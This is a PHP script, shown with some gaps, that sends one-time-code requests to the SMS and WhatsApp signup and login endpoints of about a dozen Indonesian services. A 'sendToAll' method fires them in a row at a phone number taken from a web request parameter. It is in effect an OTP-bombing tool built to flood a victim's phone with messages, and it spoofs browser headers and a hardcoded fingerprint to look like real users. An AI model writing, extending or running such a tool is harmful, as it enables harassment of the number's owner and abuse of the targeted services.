...
class SMS {
    public function sendToAloDokter(string $target): String
    {
        $endPoint = 'https://www.alodokter.com/login-with-phone-number';
        ...
        $request = $this->request('POST', $endPoint, $params, $headers);
        $response = json_decode($request['body']);
        if (isset($response->status) && $response->status === 'error') {
            return 'Failed Send OTP Alo Dokter';
        }
        return 'Done Send OTP Alo Dokter';
    }
    public function sendToOLX(string $target): String
    {
        $endPoint = 'https://www.olx.co.id/api/auth/authenticate';
        $params = json_encode([
            'grantType' => 'phone',
            'language' => 'id',
            'phone' => '+62' . $target
        ...
        $headers = [
            ...
            'x-panamera-fingerprint: 7363ac91122274c64a8bb248e7285ddf#1681724914787'
        ];
        $request = $this->request('POST', $endPoint, $params, $headers);
        if (isset($request['statusCode']) && $request['statusCode'] !== 200) {
            var_dump($request);
        }
        var_dump($request);
    }
    public function sendToMyFave(string $target): String
    {
        $endPoint = 'https://api.myfave.com/api/fave/v3/auth';
        $params = json_encode([
            'phone' => '+62' . $target
        ]);
        $headers = [
        ...
        $request = $this->request('POST', $endPoint, $params, $headers);
        if (isset($request['statusCode']) &&  in_array($request['statusCode'], [200,201]) === false) {
            return 'Failed Send OTP My Fave';
        }
        return 'Done Send OTP My Fave';
    }
    
    public function sendToOYO(string $target): String
    {
        $endPoint = 'https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id';
        $params = json_encode([
            'phone' => '0' . $target,
			'country_code' => '+62',
			'country_iso_code' => 'ID',
        ...
        $request = $this->request('POST', $endPoint, $params, $headers);
        if (isset($request['statusCode']) &&  in_array($request['statusCode'], [200,201]) === false) {
            return 'Failed Send OTP OYO';
        }
        return 'Done Send OTP OYO';
    }
        public function sendToEciID(string $target): String
    {
        $endPoint = 'https://eci.id/api/signup';
        $params = json_encode([
                'identity' => '0' . $target
        ]);
        $headers = [
...
'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        ...
        $response = json_decode($request['body']);
        if (isset($response->status) && $response->status === 'error') {
            return 'Failed Send OTP Eci ID';
        }
        return 'Done Send OTP Eci ID';
    }
     public function sendToDekoruma(string $target): String
    {
        $endPoint = 'https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json';
        $params = json_encode([
...
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://m.dekoruma.com/',
'accept-encoding: gzip,eflate,br',
'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        ];
        $request = $this->request('POST', $endPoint, $params, $headers);
        $response = json_decode($request['body']);
        if (isset($response->status) && $response->status === 'error') {
            return 'Failed Send OTP Dekoruma';
        }
        return 'Done Send OTP Dekoruma';
    }
        public function sendToMapclub(string $target): String
    {
        $endPoint = 'https://beryllium.mapclub.com/api/member/registration/sms/otp';
        $params = json_encode([
                'account' => $target
        ]);
        $headers = [
        ...
        $response = json_decode($request['body']);
        if (isset($response->status) && $response->status === 'error') {
            return 'Failed Send OTP Mapclub';
        }
        return 'Done Send OTP Mapclub';
    }
//Whatsapp

public function sendToQoala(string $target): String
    {
        $endPoint = 'https://api.qoalaplus.com/go-agent/v2/user/register';
        $params = json_encode([
                'phone_number' => '+62' . $target,
                'channel' => 'WA'
        ]);
        $headers = [
...
'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        ...
        $response = json_decode($request['body']);
        if (isset($response->status) && $response->status === 'error') {
            return 'Failed Send OTP WA Qoala';
        }
        return 'Done Send OTP WA Qoala';
    }
    public function sendToRupaRupa(string $target): String
    {
        $endPoint = 'https://wapi.ruparupa.com/auth/generate-otp';
        $params = json_encode([
                'phone' => '0' . $target,
                'action' => 'register',
                'channel' => 'chat',
...
'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        ...
        $response = json_decode($request['body']);
        if (isset($response->status) && $response->status === 'error') {
            return 'Failed Send OTP WA RupaRupa';
        }
        return 'Done Send OTP WA RupaRupa';
    }
        public function sendToSampingan(string $target): String
    {
        $endPoint = 'https://auth.sampingan.co/v1/otp';
        $params = json_encode([
                'channel' => 'WA',
                'country_code' => '+62',
                'phone_number' => $target
        ...
        $response = json_decode($request['body']);
        if (isset($response->status) && $response->status === 'error') {
            return 'Failed Send OTP WA Sampingan';
        }
        return 'Done Send OTP WA Sampingan';
    }
        public function sendToEvermos(string $target): String
    {
        $endPoint = 'https://evermos.com/api/register/phone-registration';
        $params = json_encode([
                    'phone' => '62' . $target
            ]);
        $headers = [
        ...
        $response = json_decode($request['body']);
        if (isset($response->status) && $response->status === 'error') {
            return 'Failed Send OTP WA Evermos';
        }
        return 'Done Send OTP WA Evermos';
    }
    public function sendToAll(string $target): String
    {
        echo $this->sendToOYO($target) . "\n <br />";
        echo $this->sendToEciID($target) . "\n <br />";
        echo $this->sendToDekoruma($target) . "\n <br />";
        echo $this->sendToMapclub($target) . "\n <br />";
        echo $this->sendToQoala($target) . "\n <br />";
        echo $this->sendToRupaRupa($target) . "\n <br />";
        echo $this->sendToSampingan($target) . "\n <br />";
        echo $this->sendToEvermos($target) . "\n <br />";
        return 'Process All Done !!.';
        
    }
    
    protected function request(string $method = null, string $endPoint, &$params, array $headers = null): Array
    {
        $ch = curl_init();
...
$target =  isset($_REQUEST['target']) ? $_REQUEST['target'] : false;
if ($target === false) {
    print json_encode([
        'code' => 405,
...
$request = $classSMS->sendToAll($target);
 $arr = array(
       'result' => array(
          'status' => true,
          'result' => $request
